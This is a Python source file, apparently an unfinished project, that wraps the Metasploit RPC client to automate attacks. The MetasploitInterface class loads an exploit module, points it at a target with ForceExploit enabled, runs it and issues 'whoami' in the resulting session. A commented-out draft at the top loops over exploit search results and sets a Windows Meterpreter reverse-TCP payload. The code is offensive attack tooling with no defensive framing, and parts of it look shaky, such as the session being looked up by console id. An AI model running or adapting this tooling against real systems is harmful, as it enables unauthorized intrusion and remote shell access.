# def setExploits(client, m, targetIP, port): #takes results of dirty search, target & port, and client?
#     for x in m: ## for every result in the search?
#         exploit = client.modules.use('exploit', x) # Uses the result of the exploit search
#         exploit.target = 0 # WE NEED TO SPECIFY WHICH TARGET WE ARE TARGETING
#         exploit.targetpayloads() # Need to define the common payloads and what we want - this takes the ones that work
#         payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp') # Sets a payload we would want to use
#         exploit['RHOSTS'] = data.get('targetIP') # Need to obtain targetIP addresss somehow
#         exploit['RPORT'] = port # Need to specify port?
from pymetasploit3.msfrpc import MsfRpcClient


# Inputs: Exploit, Target, Port

class MetasploitInterface:

    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, target, exploit):
        self.metasploit_ip = metasploit_ip
        self.metasploit_port = metasploit_port
        self.metasploit_pass = metasploit_pass
        self.target = target
        self.exploit = exploit

    def execute(self):
        client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly

        module = split_string[0]
        specific_module = "/".join(split_string[1:])
        
        exploit = client.modules.use(module, specific_module)
        print(exploit.missing_required)
        exploit["RHOSTS"] = self.target
        exploit["ForceExploit"] = True
        
        # print(exploit.targetpayloads)
        # print(exploit.execute())
        cid = client.consoles.console().cid
        print(client.consoles.console(cid).run_module_with_output(exploit))
        shell = client.sessions.session(cid)
        shell.write('whoami')
        print(shell.read())
        ##print(exploit.targetpayloads())
        

# Outputs: 